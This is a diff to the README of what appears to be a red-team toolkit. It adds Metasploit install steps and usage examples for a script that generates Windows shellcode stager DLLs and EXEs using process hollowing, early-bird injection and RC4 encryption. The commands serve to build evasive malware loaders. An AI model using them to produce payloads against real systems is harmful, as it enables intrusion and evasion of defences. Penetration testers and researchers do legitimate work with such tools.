@@ -8,7 +8,14 @@
 ```
 pip3 install -r requirements.txt
 
-apt install metasploit-framework
+# Kali
+apt install metasploit-framework mcs-mono
+
+# Ubuntu
+sudo apt install mcs-mono wamerican
+wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run
+chmod +x metasploit-latest-linux-x64-installer.run
+sudo ./metasploit-latest-linux-x64-installer.run
 ```
 
 ## All Tools
@@ -55,6 +62,9 @@ optional arguments:
 ```sh
 # Create a dll that will use hollowing to load shellcode
 python3 generate_win_msf_stager.py --injection hollow --format dll
+
+# Encrypt with RC4
+python3 generate_win_msf_stager.py --injection earlybird --format dll --encrypt rc4
 
 # Create a stageless exe that will load and run shellcode within the same process
 python3 generate_win_msf_stager.py --stageless --format exe
